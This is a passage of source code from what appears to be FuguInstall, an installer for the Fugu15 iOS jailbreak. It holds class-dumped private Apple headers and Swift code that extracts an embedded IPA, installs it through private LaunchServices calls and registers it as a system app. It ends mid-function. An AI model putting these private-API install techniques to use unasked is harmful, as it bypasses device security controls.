-(void)removeDeviceIdentifierForVendorName:(id)arg1 bundleIdentifier:(id)arg2 ;
-(void)enumerateApplicationsOfType:(unsigned long long)arg1 legacySPI:(BOOL)arg2 block:(/*^block*/id)arg3 ;
-(void*)ls_testWithCleanDatabaseWithError:(id*)arg1 ;
-(BOOL)getClaimedActivityTypes:(id*)arg1 domains:(id*)arg2 ;
-(BOOL)uninstallApplication:(id)arg1 withOptions:(id)arg2 usingBlock:(/*^block*/id)arg3 ;
-(BOOL)initiateProgressForApp:(id)arg1 withType:(unsigned long long)arg2 ;
-(void)enumerateBundlesOfType:(unsigned long long)arg1 usingBlock:(/*^block*/id)arg2 ;
-(id)applicationsAvailableForOpeningURL:(id)arg1 legacySPI:(BOOL)arg2 ;
-(id)pluginsWithIdentifiers:(id)arg1 protocols:(id)arg2 version:(id)arg3 withFilter:(/*^block*/id)arg4 ;
-(BOOL)installApplication:(NSURL*)arg1 withOptions:(NSDictionary*)arg2 error:(NSError**)arg3 ;
-(id)scanForApplicationStateChangesWithWhitelist:(id)arg1 ;
-(id)installProgressForBundleID:(id)arg1 makeSynchronous:(unsigned char)arg2 ;
-(BOOL)garbageCollectDatabaseWithError:(id*)arg1 ;
-(id)_LSPrivateRemovedSystemAppIdentifiers;
-(void)sendApplicationStateChangedNotificationsFor:(id)arg1 completion:(/*^block*/id)arg2 ;
-(id)directionsApplications;
-(BOOL)openURL:(id)arg1 withOptions:(id)arg2 ;
-(BOOL)openApplicationWithBundleID:(id)arg1 ;
-(id)installedPlugins;
-(void)_LSPrivateSyncWithMobileInstallation;
-(BOOL)registerApplication:(id)arg1 ;
-(id)createDeviceIdentifierWithVendorName:(id)arg1 bundleIdentifier:(id)arg2 ;
-(BOOL)unregisterApplication:(id)arg1 ;
-(id)applicationsWithUIBackgroundModes;
-(BOOL)invalidateIconCache:(id)arg1 ;
-(id)legacyApplicationProxiesListWithType:(unsigned long long)arg1 ;
-(id)publicURLSchemes;
-(BOOL)establishConnection;
-(void)_LSClearSchemaCaches;
-(id)pluginsMatchingQuery:(id)arg1 applyFilter:(/*^block*/id)arg2 ;
-(BOOL)uninstallApplication:(id)arg1 withOptions:(id)arg2 ;
-(BOOL)openSensitiveURL:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 ;
-(id)applicationsForUserActivityType:(id)arg1 limit:(unsigned long long)arg2 ;
-(id)deviceIdentifierForVendorSeedData;
-(void)getKnowledgeUUID:(id*)arg1 andSequenceNumber:(id*)arg2 ;
-(id)applicationsOfType:(unsigned long long)arg1 ;
-(id)applicationsAvailableForOpeningURL:(id)arg1 ;
-(BOOL)isVersion:(id)arg1 greaterThanOrEqualToVersion:(id)arg2 ;
-(NSMutableDictionary *)createdInstallProgresses;
-(id)applicationForUserActivityType:(id)arg1 ;
-(id)unrestrictedApplications;
-(id)removedSystemApplications;
-(void)_LSPrivateUpdateAppRemovalRestrictions;
-(BOOL)restoreSystemApplication:(id)arg1 ;
-(id)deviceIdentifierForVendor;
-(LSInstallProgressList *)observedInstallProgresses;
-(BOOL)openURL:(id)arg1 ;
-(id)applicationsWithAudioComponents;
-(BOOL)isApplicationAvailableToOpenURL:(id)arg1 error:(id*)arg2 ;
-(id)optionsFromOpenConfiguration:(id)arg1 ;
-(void)ls_resetTestingDatabase;
-(id)placeholderApplications;
-(void)enumerateBundlesOfType:(unsigned long long)arg1 block:(/*^block*/id)arg2 ;
-(void)_LSFailedToOpenURL:(id)arg1 withBundle:(id)arg2 ;
-(BOOL)installApplication:(NSURL*)arg1 withOptions:(NSDictionary*)arg2 ;
-(BOOL)registerApplicationDictionary:(NSDictionary*)arg1 ;
-(id)allInstalledApplications;
-(BOOL)openSensitiveURL:(id)arg1 withOptions:(id)arg2 ;
-(id)deviceIdentifierForAdvertising;
-(id)scanForForDeletableSystemApps;
-(BOOL)_LSPrivateDatabaseNeedsRebuild;
-(id)applicationForOpeningResource:(id)arg1 ;
-(id)URLOverrideForURL:(id)arg1 ;
-(BOOL)openURL:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 ;
-(id)URLOverrideForNewsURL:(id)arg1 ;
-(id)applicationsWithVPNPlugins;
-(void)clearAdvertisingIdentifier;
-(NSArray<LSApplicationProxy*>*)allApplications;
-(void)addObserver:(id)arg1 ;
-(void)removeObserver:(id)arg1 ;
-(id)applicationsAvailableForHandlingURLScheme:(id)arg1 ;
-(BOOL)allowsAlternateIcons;
-(BOOL)applicationIsInstalled:(id)arg1 ;
-(id)applicationsForUserActivityType:(id)arg1 ;
@end

```

`FuguInstall/Sources/CBindings/include/LSBundleProxy.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
* Operating System: Version 15.2.1 (Build 19C63)
* Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>
//#import <CoreServices/LSResourceProxy.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

@class NSString, NSURL, NSUUID, NSArray, _LSLazyPropertyList, LSApplicationProxy, NSDictionary, LSContext;

@interface LSBundleProxy : NSObject /*LSResourceProxy <NSSecureCoding>*/ {

	NSString* _localizedShortName;
	BOOL _foundBackingBundle;
	BOOL _containerized;
	NSString* _bundleIdentifier;
	NSURL* _bundleURL;
	NSString* _bundleExecutable;
	NSURL* _bundleContainerURL;
	NSString* _bundleVersion;
	NSString* _sdkVersion;
	NSUUID* _cacheGUID;
	unsigned long long _sequenceNumber;
	NSArray* _machOUUIDs;
	unsigned long long _compatibilityState;
	_LSLazyPropertyList* __infoDictionary;
	_LSLazyPropertyList* __entitlements;
	_LSLazyPropertyList* __environmentVariables;

}

@property (readonly) BOOL _inf_isSystem; 
@property (readonly) BOOL if_isSystem; 
@property (readonly) BOOL if_isAppExtension; 
@property (readonly) BOOL if_isWatchKitAppExtension; 
@property (readonly) LSApplicationProxy * if_containingAppProxy; 
@property (nonatomic,readonly) NSString * localizedShortName; 
@property (setter=_setInfoDictionary:,nonatomic,copy) _LSLazyPropertyList * _infoDictionary;                          //@synthesize _infoDictionary=__infoDictionary - In the implementation block
@property (nonatomic,copy) NSArray * machOUUIDs;                                                                      //@synthesize machOUUIDs=_machOUUIDs - In the implementation block
@property (setter=setSDKVersion:,nonatomic,copy) NSString * sdkVersion;                                               //@synthesize sdkVersion=_sdkVersion - In the implementation block
@property (setter=_setEntitlements:,nonatomic,copy) _LSLazyPropertyList * _entitlements;                              //@synthesize _entitlements=__entitlements - In the implementation block
@property (setter=_setEnvironmentVariables:,nonatomic,copy) _LSLazyPropertyList * _environmentVariables;              //@synthesize _environmentVariables=__environmentVariables - In the implementation block
@property (assign,setter=_setCompatibilityState:,nonatomic) unsigned long long compatibilityState;                    //@synthesize compatibilityState=_compatibilityState - In the implementation block
@property (nonatomic,readonly) NSString * bundleIdentifier;                                                           //@synthesize bundleIdentifier=_bundleIdentifier - In the implementation block
@property (nonatomic,readonly) NSString * bundleType; 
@property (nonatomic,readonly) NSURL * bundleURL;                                                                     //@synthesize bundleURL=_bundleURL - In the implementation block
@property (nonatomic,readonly) NSString * bundleExecutable;                                                           //@synthesize bundleExecutable=_bundleExecutable - In the implementation block
@property (nonatomic,readonly) NSString * canonicalExecutablePath; 
@property (nonatomic,readonly) NSURL * containerURL; 
@property (nonatomic,readonly) NSURL * dataContainerURL; 
@property (nonatomic,readonly) NSURL * bundleContainerURL;                                                            //@synthesize bundleContainerURL=_bundleContainerURL - In the implementation block
@property (nonatomic,readonly) NSURL * appStoreReceiptURL; 
@property (nonatomic,readonly) NSString * bundleVersion;                                                              //@synthesize bundleVersion=_bundleVersion - In the implementation block
@property (nonatomic,readonly) NSString * signerIdentity; 
@property (nonatomic,readonly) NSDictionary * entitlements; 
@property (nonatomic,readonly) NSDictionary * environmentVariables; 
@property (nonatomic,readonly) NSDictionary * groupContainerURLs; 
@property (nonatomic,readonly) BOOL foundBackingBundle;                                                               //@synthesize foundBackingBundle=_foundBackingBundle - In the implementation block
@property (getter=isContainerized,nonatomic,readonly) BOOL containerized;                                             //@synthesize containerized=_containerized - In the implementation block
@property (nonatomic,readonly) BOOL profileValidated; 
@property (nonatomic,readonly) BOOL UPPValidated; 
@property (nonatomic,readonly) BOOL freeProfileValidated; 
@property (nonatomic,readonly) NSString * signerOrganization; 
@property (nonatomic,readonly) NSUUID * cacheGUID;                                                                    //@synthesize cacheGUID=_cacheGUID - In the implementation block
@property (nonatomic,readonly) unsigned long long sequenceNumber;                                                     //@synthesize sequenceNumber=_sequenceNumber - In the implementation block
+(id)hk_appExtensionContainerBundleForConnection:(id)arg1 ;
+(id)bundleProxyForCurrentProcess;
//+(id)bundleProxyWithAuditToken:(SCD_Struct_FS1)arg1 error:(id*)arg2 ;
+(BOOL)canInstantiateFromDatabase;
+(id)bundleProxyForURL:(id)arg1 ;
+(void)clearBundleProxyForCurrentProcess;
+(id)bundleProxyForURL:(id)arg1 error:(id*)arg2 ;
+(id)bundleProxyForIdentifier:(id)arg1 ;
+(BOOL)supportsSecureCoding;
-(id)__ck_icon;
-(id)un_applicationBundleIdentifier;
-(id)un_applicationBundleURL;
-(BOOL)if_isWatchKitAppExtension;
-(BOOL)if_isSystem;
-(BOOL)if_isAppExtension;
-(LSApplicationProxy *)if_containingAppProxy;
-(BOOL)_inf_isSystem;
-(NSString *)localizedShortName;
-(NSUUID *)cacheGUID;
-(NSString *)bundleType;
-(_LSLazyPropertyList *)_entitlements;
-(NSURL *)containerURL;
-(id)localizedName;
-(id)_localizedNameWithPreferredLocalizations:(id)arg1 useShortNameOnly:(BOOL)arg2 ;
-(NSDictionary *)environmentVariables;
-(id)_initWithBundleUnit:(unsigned)arg1 context:(LSContext*)arg2 bundleType:(unsigned long long)arg3 bundleID:(id)arg4 localizedName:(id)arg5 bundleContainerURL:(id)arg6 dataContainerURL:(id)arg7 resourcesDirectoryURL:(id)arg8 iconsDictionary:(id)arg9 iconFileNames:(id)arg10 version:(id)arg11 ;
-(id)objectForInfoDictionaryKey:(id)arg1 ofClass:(Class)arg2 valuesOfClass:(Class)arg3 ;
-(NSURL *)bundleContainerURL;
-(void)setSDKVersion:(NSString*)arg1 ;
-(void)setMachOUUIDs:(NSArray *)arg1 ;
-(NSDictionary *)groupContainerURLs;
-(_LSLazyPropertyList *)_infoDictionary;
-(id)_managedPersonas;
-(BOOL)_usesSystemPersona;
-(id)localizedNameWithPreferredLocalizations:(id)arg1 useShortNameOnly:(BOOL)arg2 ;
-(id)entitlementValueForKey:(id)arg1 ofClass:(Class)arg2 valuesOfClass:(Class)arg3 ;
-(void)_setEntitlements:(_LSLazyPropertyList*)arg1 ;
-(NSString *)bundleExecutable;
-(NSURL *)appStoreReceiptURL;
-(BOOL)foundBackingBundle;
-(id)objectForInfoDictionaryKey:(id)arg1 ofClass:(Class)arg2 ;
-(BOOL)_hasAssociatedPersonas;
-(id)localizedValuesForKeys:(id)arg1 fromTable:(id)arg2 ;
-(id)appStoreReceiptName;
-(_LSLazyPropertyList *)_environmentVariables;
-(void)_setInfoDictionary:(_LSLazyPropertyList*)arg1 ;
-(id)_valueForEqualityTesting;
-(NSURL *)dataContainerURL;
-(NSURL *)bundleURL;
-(id)entitlementValuesForKeys:(id)arg1 ;
-(void)_setEnvironmentVariables:(_LSLazyPropertyList*)arg1 ;
-(id)entitlementValueForKey:(id)arg1 ofClass:(Class)arg2 ;
-(NSString *)canonicalExecutablePath;
-(id)objectsForInfoDictionaryKeys:(id)arg1 ;
-(void)_setCompatibilityState:(unsigned long long)arg1 ;
-(unsigned long long)sequenceNumber;
-(void)encodeWithCoder:(id)arg1 ;
-(NSString *)bundleVersion;
-(NSString *)signerIdentity;
-(NSString *)signerOrganization;
-(unsigned long long)compatibilityState;
-(NSDictionary *)entitlements;
-(BOOL)isEqual:(id)arg1 ;
-(id)initWithCoder:(id)arg1 ;
-(BOOL)isContainerized;
-(NSArray *)machOUUIDs;
-(NSString *)bundleIdentifier;
-(unsigned long long)hash;
-(NSString *)sdkVersion;
@end


```

`FuguInstall/Sources/CBindings/include/_LSApplicationState.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
* Operating System: Version 15.2.1 (Build 19C63)
* Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>
//#import <libobjc.A.dylib/NSCopying.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

@class NSString;

@interface _LSApplicationState : NSObject <NSCopying, NSSecureCoding> {

	NSString* _bundleIdentifier;
	unsigned long long _stateFlags;
	int _ratingRank;
	unsigned long long _installType;

}

@property (nonatomic,readonly) unsigned long long installType; 
@property (nonatomic,copy,readonly) NSString * bundleIdentifier;                             //@synthesize bundleIdentifier=_bundleIdentifier - In the implementation block
@property (getter=isInstalled,nonatomic,readonly) BOOL installed; 
@property (getter=isPlaceholder,nonatomic,readonly) BOOL placeholder; 
@property (getter=isValid,nonatomic,readonly) BOOL valid; 
@property (getter=isRestricted,nonatomic,readonly) BOOL restricted; 
@property (getter=isRemovedSystemApp,nonatomic,readonly) BOOL removedSystemApp; 
@property (getter=isBlocked,nonatomic,readonly) BOOL blocked; 
@property (getter=isAlwaysAvailable,nonatomic,readonly) BOOL alwaysAvailable; 
@property (getter=isDowngraded,nonatomic,readonly) BOOL downgraded; 
+(BOOL)supportsSecureCoding;
-(BOOL)isInstalled;
-(void)addStateFlag:(unsigned long long)arg1 ;
-(void)encodeWithCoder:(id)arg1 ;
-(BOOL)isRemovedSystemApp;
-(unsigned long long)installType;
-(BOOL)isPlaceholder;
-(BOOL)isRestricted;
-(BOOL)isBlocked;
-(id)description;
-(id)initWithBundleIdentifier:(id)arg1 stateFlags:(unsigned long long)arg2 ratingRank:(int)arg3 installType:(unsigned long long)arg4 ;
-(id)initWithCoder:(id)arg1 ;
-(id)copyWithZone:(NSZone*)arg1 ;
-(NSString *)bundleIdentifier;
-(BOOL)isDowngraded;
-(BOOL)isAlwaysAvailable;
-(BOOL)isValid;
@end


```

`FuguInstall/Sources/CBindings/include/posix_spawn.h`:

```h
/*
 * Copyright (c) 2006, 2008 Apple,Inc. All rights reserved.
 *
 * @APPLE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_LICENSE_HEADER_END@
 */

#ifndef _SPAWN_PRIVATE_H_
#define _SPAWN_PRIVATE_H_

#include <spawn.h>
#include <sys/cdefs.h>
#include <sys/types.h>
#include <Availability.h>
#include <TargetConditionals.h>

#undef __API_AVAILABLE
#define __API_AVAILABLE(...)

__BEGIN_DECLS

int     posix_spawnattr_getpcontrol_np(const posix_spawnattr_t * __restrict, int * __restrict) __API_AVAILABLE(macos(10.6), ios(3.2));
int     posix_spawnattr_setpcontrol_np(posix_spawnattr_t *, const int) __API_AVAILABLE(macos(10.6), ios(3.2));

int     posix_spawnattr_getprocesstype_np(const posix_spawnattr_t * __restrict, int * __restrict) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_setprocesstype_np(posix_spawnattr_t *, const int) __API_AVAILABLE(macos(10.8), ios(6.0));

int     posix_spawnattr_setcpumonitor(posix_spawnattr_t * __restrict, uint64_t, uint64_t) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_getcpumonitor(posix_spawnattr_t * __restrict, uint64_t *, uint64_t *) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_setcpumonitor_default(posix_spawnattr_t * __restrict) __API_AVAILABLE(macos(10.9), ios(6.0));

#if (TARGET_OS_IPHONE && !TARGET_OS_SIMULATOR)
int     posix_spawnattr_setjetsam(posix_spawnattr_t * __restrict attr,
    short flags, int priority, int memlimit) __API_UNAVAILABLE(macos) __API_AVAILABLE(ios(5.0));
#endif /* (TARGET_OS_IPHONE && !TARGET_OS_SIMULATOR) */

int     posix_spawnattr_setjetsam_ext(posix_spawnattr_t * __restrict attr,
    short flags, int priority, int memlimit_active, int memlimit_inactive) __API_AVAILABLE(macos(10.11), ios(9.0));

// time-to-relaunch after jetsam, set by launchd
int     posix_spawnattr_set_jetsam_ttr_np(const posix_spawnattr_t * __restrict attr, uint32_t count, uint32_t *ttrs_millis) __OSX_AVAILABLE_STARTING(__MAC_10_15, __IPHONE_13_0);

int     posix_spawnattr_set_threadlimit_ext(posix_spawnattr_t * __restrict attr,
    int thread_limit)  __API_AVAILABLE(macos(10.14), ios(12.0), tvos(12.0), watchos(5.0));

#define POSIX_SPAWN_IMPORTANCE_PORT_COUNT 32
int     posix_spawnattr_set_importancewatch_port_np(posix_spawnattr_t * __restrict attr,
    int count, mach_port_t portarray[])  __API_AVAILABLE(macos(10.9), ios(6.0));

int     posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

int
posix_spawnattr_set_ptrauth_task_port_np(posix_spawnattr_t * __restrict attr,
    mach_port_t port) __API_AVAILABLE(macos(10.16), ios(14.0), tvos(14.0), watchos(7.0));

#define POSIX_SPAWN_MACPOLICYINFO_WITHSIZE 1
int     posix_spawnattr_getmacpolicyinfo_np(const posix_spawnattr_t * __restrict, const char *, void **, size_t *) __API_AVAILABLE(macos(10.9), ios(7.0));
int     posix_spawnattr_setmacpolicyinfo_np(posix_spawnattr_t * __restrict, const char *, void *, size_t) __API_AVAILABLE(macos(10.9), ios(7.0));

int     posix_spawnattr_setcoalition_np(const posix_spawnattr_t * __restrict, uint64_t, int, int) __API_AVAILABLE(macos(10.10), ios(8.0));

int     posix_spawnattr_set_qos_clamp_np(const posix_spawnattr_t * __restrict, uint64_t) __API_AVAILABLE(macos(10.10), ios(8.0));
int     posix_spawnattr_get_qos_clamp_np(const posix_spawnattr_t * __restrict, uint64_t * __restrict) __API_AVAILABLE(macos(10.10), ios(8.0));

int     posix_spawnattr_set_darwin_role_np(const posix_spawnattr_t * __restrict, uint64_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_get_darwin_role_np(const posix_spawnattr_t * __restrict, uint64_t * __restrict) __API_AVAILABLE(macos(10.11), ios(9.0));

int     posix_spawnattr_set_persona_np(const posix_spawnattr_t * __restrict, uid_t, uint32_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t * __restrict, gid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_groups_np(const posix_spawnattr_t * __restrict, int, gid_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));

int     posix_spawnattr_set_max_addr_np(const posix_spawnattr_t * __restrict attr, uint64_t max_addr) __API_AVAILABLE(macos(10.14), ios(12.0), tvos(12.0), watchos(5.0));

int     posix_spawnattr_set_uid_np(const posix_spawnattr_t * __restrict, uid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_gid_np(const posix_spawnattr_t * __restrict, gid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_groups_np(const posix_spawnattr_t * __restrict, int, gid_t * __restrict, uid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_login_np(const posix_spawnattr_t * __restrict, const char * __restrict) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

int     posix_spawnattr_set_subsystem_root_path_np(posix_spawnattr_t *attr, char *path); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawnattr_set_platform_np(posix_spawnattr_t *attr, int platform, uint32_t flags); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawnattr_disable_ptr_auth_a_keys_np(posix_spawnattr_t *attr, uint32_t flags); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawn_file_actions_add_fileportdup2_np(posix_spawn_file_actions_t * __restrict, mach_port_t, int) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

struct sandbox_spawnattrs {
    uint8_t unk[8192];
};

void sandbox_spawnattrs_init(struct sandbox_spawnattrs *attrs);
int sandbox_spawnattrs_setprofilename(struct sandbox_spawnattrs *attrs, const char *);
int sandbox_spawnattrs_setcontainer(struct sandbox_spawnattrs *attrs, const char *);
int sandbox_init(const char *profile, uint64_t flags, char **errorbuf);

void* sandbox_create_params();
int sandbox_set_param(void* params, const char* key, const char* value);
void* sandbox_compile_string(const char* profile_str,
                             void* params,
                             char** error);
int sandbox_apply(void* profile);
void sandbox_free_params(void* params);
void sandbox_free_profile(void* profile);

struct sandbox_policy_layout {
    void *profile;
    uint64_t len;
    void *container;
    uint64_t containerLen;
    uint64_t pad1;
    uint64_t pad2;
};

int __sandbox_ms(const char* policy, int call, struct sandbox_policy_layout* arg);

__END_DECLS

#endif /* !defined _SPAWN_PRIVATE_H_*/

```

`FuguInstall/Sources/FuguInstall/ContentView.swift`:

```swift
//
//  ContentView.swift
//  jailbreakd
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import SwiftUI
import MachO

import CBindings
import ZIPFoundation

func launchApp(withIdentifier id: String) {
    typealias LaunchType = @convention(c) (_: CFString, _: Bool) -> Int32
    if let hndl = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW) {
        if let fn = dlsym(hndl, "SBSLaunchApplicationWithIdentifier") {
            let SBSLaunchApplicationWithIdentifier = unsafeBitCast(fn, to: LaunchType.self)
            _ = SBSLaunchApplicationWithIdentifier(id as CFString, false)
        }
    }
}

struct ContentView: View {
    @State var currentStep   = 1
    @State var description   = "Extracting Fugu15.ipa"
    @State var installFailed = false
    @State var errorDesc: String?
    @State var done = false
    @State var bundleID: String?
    
    var body: some View {
        NavigationView {
            VStack() {
                Divider()
                VStack {
                    Spacer()
                    Text(installFailed ? "Fugu15 installation failed!" : done ? "Fugu15 installation completed!" : "Installing Fugu15, please wait...").padding(.bottom)
                    if !done {
                        Text("Step \(currentStep)/8\(installFailed ? " [Failed]" : "")").padding(.top)
                        Text(description).font(.footnote).padding(.top, -5.0).padding(.bottom)
                        if let errorDesc = errorDesc {
                            Text(errorDesc).font(.footnote).padding([.leading, .trailing])
                        }
                    } else {
                        Button("Launch Fugu15") {
                            launchApp(withIdentifier: bundleID!)
                        }
                        .padding(.all)
                        .background(Color.blue)
                        .cornerRadius(10)
                        .foregroundColor(Color.white)
                    }
                    Spacer()
                }
                Spacer()
            }
            .onAppear {
                DispatchQueue(label: "FuguInstall").async {
                    self.doInstall()
                }
            }
            .navigationTitle("FuguInstall")
            .navigationBarTitleDisplayMode(.inline)
        }.navigationViewStyle(.stack)
    }
    
    func nextStep(description: String) {
        DispatchQueue.main.async {
            self.currentStep += 1
            self.description = description
        }
    }
    
    func error(description: String, err: Error? = nil) {
        DispatchQueue.main.async {
            self.description   = description
            if let err = err {
                self.errorDesc = "\(err)"
            }
            
            self.installFailed = true
        }
    }
    
    func getIPA() -> Data? {
        // Open our executable
        do {
            let exe = try Data(contentsOf: Bundle.main.executableURL!)
            let exeEnd = exe.count
            let highest = exe.withUnsafeBytes { ptr in
                let hdr = ptr.baseAddress!.assumingMemoryBound(to: fat_header.self)
                guard hdr.pointee.magic.bigEndian == FAT_MAGIC else {
                    error(description: "Invalid FAT magic!")
                    return 0
                }
                
                let archs = ptr.baseAddress!.advanced(by: MemoryLayout<fat_header>.size).assumingMemoryBound(to: fat_arch.self)
                var currentHighest: UInt32 = 0
                for i in 0..<Int(hdr.pointee.nfat_arch.bigEndian) {
                    let start = archs[i].offset.bigEndian
                    let end   = start + archs[i].size.bigEndian
                    if currentHighest < end {
                        currentHighest = end
                    }
                }
                
                return Int(currentHighest)
            }
            
            let remaining = exeEnd - highest
            guard highest != 0,
                  remaining > 0 else {
                error(description: "Failed to find ipa in FAT!")
                return nil
            }
            
            return exe.subdata(in: highest..<exeEnd)
        } catch let e {
            error(description: "Failed to read ipa!", err: e)
            return nil
        }
    }
    
    func doInstall() {
        // Extract IPA
        guard let ipaData = getIPA() else {
            return
        }
        
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let ipa = docs.appendingPathComponent("ipa")
        let dst = docs.appendingPathComponent("extracted")
        
        do {
            try ipaData.write(to: ipa)
        } catch let e {
            error(description: "Failed to write ipa to disk!", err: e)
            return
        }
        
        try? FileManager.default.removeItem(at: dst)
        try? FileManager.default.createDirectory(at: dst, withIntermediateDirectories: true)
        do {
            try FileManager.default.unzipItem(at: ipa, to: dst)
        } catch let e {
            error(description: "Failed to unzip ipa!", err: e)
            return
        }
        
        nextStep(description: "Getting App infos")
        
        var bundleID: String?
        var appPath:  URL!
        
        do {
            let payload = dst.appendingPathComponent("Payload")
            let apps = try FileManager.default.contentsOfDirectory(atPath: payload.path)
            var found = false
            for app in apps {
                if app.hasSuffix(".app") {
                    guard !found else {
                        error(description: "Attempting to install multiple Apps (not supported)!")
                        return
                    }
                    
                    let infoData = try Data(contentsOf: payload.appendingPathComponent(app).appendingPathComponent("Info.plist"))
                    guard let info = try PropertyListSerialization.propertyList(from: infoData, format: nil) as? [String: Any] else {
                        error(description: "Info.plist is not a Dictionary!")
                        return
                    }
                    
                    guard let id = info["CFBundleIdentifier"] as? String else {
                        error(description: "Info.plist has no/bad CFBundleIdentifier!")
                        return
                    }
                    
                    bundleID = id
                    appPath  = payload.appendingPathComponent(app)
                    found    = true
                }
            }
        } catch let e {
            error(description: "Failed to get App infos!", err: e)
            return
        }
        
        guard let bundleID = bundleID else {
            error(description: "Couldn't get App bundle id!")
            return
        }
        
        self.bundleID = bundleID
        
        do {
            guard let myId = Bundle.main.bundleIdentifier else {
                error(description: "Failed to get my bundle identifier!")
                return
            }
            
            let fuguInstallDict = ["InstalledBy": myId]
            let fuguInstallPlist = try PropertyListSerialization.data(fromPropertyList: fuguInstallDict, format: .xml, options: .zero)
            try fuguInstallPlist.write(to: appPath.unsafelyUnwrapped.appendingPathComponent("FuguInstall.plist"))
        } catch let e {
            error(description: "Failed to create FuguInstall.plist!", err: e)
            return
        }
        
        nextStep(description: "Removing old App (if it exists)")
        
        let workspace = LSApplicationWorkspace.default()!
        workspace.uninstallApplication(bundleID, withOptions: nil)
        
        nextStep(description: "Installing App")
        
        do {
            try workspace.installApplication(dst, withOptions: [
                LSInstallTypeKey: 1,
                "PackageType": "Placeholder"
            ]) { x, y in
                if let info = x as? [String: Any] {
                    if let state = info["Status"] as? String {
                        if let percent = info["PercentComplete"] as? Int {
                            errorDesc = "\(state) [\(percent)%]" // Not an error, just used to log
                        }
                    }
                }
            }
        } catch let e {
            error(description: "Failed to install App!", err: e)
            return
        }
        
        errorDesc = nil
        
        nextStep(description: "Getting App directory")
        
        guard let proxy = LSApplicationProxy(forIdentifier: bundleID) else {
            error(description: "Failed to get LSApplicationProxy for App!")
            return
        }
        
        nextStep(description: "Registering App")
        
        // Let's hope there are no PlugIns...
        workspace.registerApplicationDictionary([
            "ApplicationType": "System",
            "IsDeletable": 1,
            "CFBundleIdentifier": proxy.applicationIdentifier!,
            "Path": proxy.bundleURL!.path,
            "Container": proxy.containerURL!.path
        ])
        
        nextStep(description: "Fixing App permissions")
        
        try? FileManager.default.unzipItem(at: ipa, to: dst)
        
        let res = execCmd(args: [CommandLine.arguments[0], "fixAppPerm", dst.path, proxy.bundleURL!.path])
        guard res == 0 else {
            error(description: "Failed to fix App permissions!")
            return
        }
                                           
        try? FileManager.default.removeItem(at: dst)
        
        nextStep(description: "Installation completed!")
        self.done = true
        
        usleep(100000)
        
        launchApp(withIdentifier: bundleID)
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}

```

`FuguInstall/Sources/FuguInstall/FuguInstallApp.swift`:

```swift
//
//  FuguInstallApp.swift
//  FuguInstall
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import SwiftUI

struct FuguInstallApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

```

`FuguInstall/Sources/FuguInstall/main.swift`:

```swift
//
//  main.swift
//  FuguInstall
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import CBindings

func execCmd(args: [String], fileActions: posix_spawn_file_actions_t? = nil) -> Int32? {
    var fileActions = fileActions
    
